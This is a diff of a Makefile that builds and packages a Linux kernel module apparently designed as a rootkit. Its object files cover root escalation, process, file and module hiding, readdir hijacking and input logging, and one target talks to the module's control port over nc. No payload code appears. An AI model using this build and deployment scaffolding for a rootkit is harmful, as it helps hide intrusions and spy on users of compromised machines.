@@ -12,8 +12,16 @@
 
 moduleName = blank
 obj-m += $(moduleName).o
+
+allSourceFilesAndHeaders = $(wildcard **.c **.h)
 blank-objs += getRoot.o hideProcEntry.o communication.o readdirHijack.o processHider.o processHiderPidManipulation.o main.o fileHide.o moduleHide.o logInput.o common.o communicationOutput.o buffer/buffer.o 
 outputFileName=$(moduleName).ko
+
+deploymentTemplateFiles = $(wildcard deploymentTemplate/*.sh)
+deploymentFiles = $(subst deploymentTemplate, deployment, $(deploymentTemplateFiles)) deployment/$(outputFileName)
+
+
+
 
 #TODO: fix location buffer is build - Ensure "buffer/makefile"  does not generate a conflicting ".o" file
 
@@ -21,7 +29,7 @@ BUILDDIR = $(shell pwd)
 
 #todo: automatically run buffer test
 
-default: all
+default: all 
 
 install: uninstallSilently all
 	./deployment/install.sh
@@ -33,15 +41,21 @@ uninstallSilently:
 	-@echo "exit" | nc localhost 9000 #TODO: don't hard code this
 	-@rmmod $(moduleName) 2> /dev/null 
 
-# setupDeployment: bulildModule
-# 	mkdir "deployment" -p
-# 	cp deploymentTemplate/*.sh blank.ko  "deployment/"
 
-all: $(outputFileName)
-	mkdir "deployment" -p
-	cp deploymentTemplate/*.sh $(outputFileName) "deployment/"
+all: $(outputFileName) setupDeployment
+
+setupDeployment: $(deploymentFiles)
 	
-$(outputFileName):
+deployment/%.sh: deploymentTemplate/%.sh
+	@mkdir "deployment" -p
+	cp "$(<)" "$(@)" 
+	
+deployment/%.ko: %.ko $(outputFileName)
+	@mkdir "deployment" -p
+	cp "$(<)" "$(@)" 
+	
+
+$(outputFileName): $(allSourceFilesAndHeaders)
 	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(BUILDDIR) modules
 	
 clean:
@@ -50,6 +64,4 @@ clean:
 
 #environmentSpecificOptions.h: 	 # we probably should avoid the need to be root to compile
 #	./getEnvironmentSpecificOptions.sh > environmentSpecificOptions.h
-
-
 	
